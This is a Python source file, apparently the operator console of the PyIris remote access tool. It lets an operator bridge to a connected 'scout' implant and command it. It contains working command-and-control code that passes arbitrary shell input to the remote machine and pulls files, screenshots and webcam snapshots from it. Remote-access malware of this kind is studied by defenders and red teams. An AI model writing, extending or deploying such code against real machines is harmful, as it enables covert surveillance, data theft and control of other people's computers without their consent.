import time
import socket
import library.commands.global_interface.clear as clear
import library.commands.global_interface.quit as quit
import library.commands.global_interface.python as python
import library.commands.global_interface.local as local
import library.commands.global_interface.help as help
import library.commands.direct_commands.download as download
import library.commands.direct_commands.upload as upload
import library.commands.direct_commands.screen as screen
import library.commands.direct_commands.webcam_snap as webcam_snap
import library.modules.recv_all as recv_all
import library.modules.config as config
import library.commands.scout_interface.ping as ping
import library.modules.send_and_recv as send_and_recv

config.main()


def main(scout_id):
    try:
        scout_id = scout_id.split(' ', 1)[1]
        scout_prompt = config.scout_database[scout_id][1] + ':' + config.scout_database[scout_id][2]
        print '[+]Bridged to : ' + scout_id
    except (IndexError, KeyError):
        print '[-]Please enter a valid scout ID'
        return
    while True:
        try:
            prompt = raw_input('PyIris (Scout@' + scout_prompt + ') > ').strip()
            command = prompt.split(' ', 1)[0]
            if command == 'back':
                print '[*]Returning to scout interface...'
                return
            elif command == 'clear':
                clear.main()
            elif command == 'disconnect':
                print send_and_recv.main(prompt, scout_id)
                del (config.scout_database[scout_id])
                print '[*]Returning...'
                return
            elif command in ('?', 'help'):
                help.main('direct', prompt)
            elif command == 'kill':
                print send_and_recv.main(prompt, scout_id)
                del (config.scout_database[scout_id])
                print '[*]Returning...'
                return
            elif command in ('!', 'local'):
                local.main(prompt)
            elif command == 'main':
                print '[*]Returning to scout interface...'
                return 'home'
            elif command == 'python':
                python.main()
            elif command == 'quit':
                quit.main()
            elif command == 'sleep':
                data = send_and_recv.main(prompt, scout_id)
                print data
                if data.startswith('[*]'):
                    del (config.scout_database[scout_id])
                    print '[*]Returning...'
                    return
            elif command == 'download':
                config.scout_database[scout_id][0].sendall(prompt)
                download.main(config.scout_database[scout_id][0])
            elif command == 'upload':
                upload.main(config.scout_database[scout_id][0], prompt)
            elif command == 'screen':
                config.scout_database[scout_id][0].sendall(command)
                screen.main(config.scout_database[scout_id][0])
            elif command == 'webcam_snap':
                config.scout_database[scout_id][0].sendall(command)
                webcam_snap.main(config.scout_database[scout_id][0])
            elif command == 'ping':
                ping.main(prompt)
            elif not command:
                pass
            else:
                config.scout_database[scout_id][0].sendall(prompt)
                data = recv_all.main(config.scout_database[scout_id][0])
                print data
                # print '[-]Invalid command, run "help" for help menu'
        except EOFError:
            try:
                time.sleep(2)
            except KeyboardInterrupt:
                quit.main()
        except KeyboardInterrupt:
            quit.main()
        except (socket.error, socket.timeout):
            print '[-]Scout has unexpectedly died, removing from database...'
            del (config.scout_database[scout_id])
            return
